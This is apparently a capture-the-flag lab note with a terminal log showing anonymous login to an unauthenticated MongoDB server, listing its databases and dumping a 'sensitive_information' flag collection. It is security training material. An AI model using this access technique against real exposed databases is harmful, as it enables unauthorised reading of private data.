mongo ipaddress - anonymous login

db.flag.find().forEach(printjson)


https://www.mongodb.com/docs/manual/reference/command/

```sh
──(kali㉿kali)-[~]
└─$ mongo  10.129.186.31
MongoDB shell version v6.0.1
connecting to: mongodb://10.129.186.31:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("d4844b87-7500-4d06-bccd-0333501c94ed") }
MongoDB server version: 3.6.8
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting: 
2023-08-10T03:37:12.434+0000 I STORAGE  [initandlisten] 
2023-08-10T03:37:12.434+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2023-08-10T03:37:12.434+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2023-08-10T03:37:13.927+0000 I CONTROL  [initandlisten] 
2023-08-10T03:37:13.927+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-08-10T03:37:13.927+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-08-10T03:37:13.927+0000 I CONTROL  [initandlisten] 
---
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use admin
switched to db admin
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> show flag
uncaught exception: Error: don't know how to show [flag] :
shellHelper.show@src/mongo/shell/utils.js:1225:11
shellHelper@src/mongo/shell/utils.js:852:36
@(shellhelp2):1:12
> db.flag.find()
{ "_id" : ObjectId("630e3dbcb82540ebbd1748c5"), "flag" : "1b6e6fb359e7c40241b6d431427ba6ea" }
> db.flag.find().pretty()
{
	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
> 

```